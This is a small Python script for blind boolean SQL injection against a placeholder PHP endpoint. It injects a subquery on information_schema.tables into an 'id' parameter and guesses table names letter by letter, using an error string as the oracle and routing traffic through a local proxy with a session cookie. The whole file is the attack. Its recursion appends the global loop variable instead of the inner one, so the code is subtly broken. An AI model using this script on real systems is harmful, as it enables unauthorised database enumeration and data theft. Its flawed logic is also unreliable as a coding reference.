#!/usr/bin/env python3
import requests
import sys
#from string import ascii_letters

# Ascii letters ordered by the most common letter first
ascii_letters = "etaoinshrdlcumwfgypbvkjxqz"

url   = "http://foo/bar.php"
token = "session12345"
agent = "Mozilla/5.0"

def dbquery(guess):
    query = "12345+AND/**/(SELECT/**/count(TABLE_NAME)+from+information_schema.tables+WHERE+table_name+like+'" + guess + "%'+LIMIT+1)+>+0"
    request_url = url + "?id=" + query

    resp = requests.get(request_url, verify=False,
        cookies={"Session" : token},
        headers={"User-Agent" : agent},
        proxies={"http" : "http://localhost:8080"},
    )

    if "errorStringGoesHere" not in resp.text:
        print(guess)
        for char in ascii_letters:
            dbquery(guess + c)

        return guess

for c in ascii_letters:
    dbquery(c)
